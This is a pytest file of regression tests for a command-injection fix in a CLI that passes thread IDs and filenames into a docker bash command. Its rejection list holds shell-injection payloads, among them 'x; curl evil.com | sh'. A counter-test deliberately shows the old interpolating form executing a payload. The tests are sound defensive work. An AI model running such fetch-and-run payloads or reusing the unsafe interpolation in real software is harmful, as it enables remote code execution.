"""
tests/test_cli_security.py

Regression tests for the command injection fixed in CHY-76.

Covers:
  - _THREAD_ID_RE accepts plain identifiers and rejects shell metacharacters
  - The docker command passes the filename and thread ID as positional
    parameters, so bash never sees them as code
  - bash itself treats such a parameter as data, not as a command

The last test shells out on purpose: the whole point of the fix is what bash
does with the value, and only bash can prove that.
"""
import subprocess

import pytest

from cli.main import _THREAD_ID_RE


# ── thread ID validation ──────────────────────────────────────────────────────

@pytest.mark.parametrize("value", [
    "study-run-1",
    "banking-run-42",
    "a.b_c-1",
    "ABC123",
])
def test_thread_id_accepts_plain_identifiers(value):
    assert _THREAD_ID_RE.match(value)


@pytest.mark.parametrize("value", [
    "x; curl evil.com | sh",   # command chaining
    "a$(id)",                  # command substitution
    "a`id`",                   # legacy command substitution
    "a&&b",                    # conditional chaining
    "a|b",                     # pipe
    "a b",                     # whitespace splits into two arguments
    "../escape",               # path traversal
    "",                        # empty
])
def test_thread_id_rejects_shell_metacharacters(value):
    assert not _THREAD_ID_RE.match(value)


# ── the actual injection barrier ──────────────────────────────────────────────

def test_bash_treats_positional_parameter_as_data(tmp_path):
    """A shell metacharacter payload must not execute when passed as $1.

    Mirrors how cli.main builds its docker command: a static script plus the
    untrusted values as positional parameters after a "_" placeholder for $0.
    """
    marker = tmp_path / "PWNED"
    payload = f"x; touch {marker}"

    inner = 'echo "$1"'
    result = subprocess.run(
        ["bash", "-c", inner, "_", payload],
        capture_output=True, text=True, timeout=10,
    )

    assert result.returncode == 0
    # The payload comes back verbatim as data ...
    assert payload in result.stdout
    # ... and its command part never ran.
    assert not marker.exists(), "payload executed — injection barrier is broken"


def test_interpolated_string_would_execute(tmp_path):
    """Counter-test: the old interpolating form does execute the payload.

    Documents why the fix was necessary. If this ever stops failing to create
    the marker, the assumption behind CHY-76 no longer holds.
    """
    marker = tmp_path / "PWNED_OLD"
    payload = f"x; touch {marker}"

    inner = "echo {}".format(payload)  # the pre-fix pattern
    subprocess.run(["bash", "-c", inner], capture_output=True, timeout=10)

    assert marker.exists(), "expected the unsafe form to execute the payload"
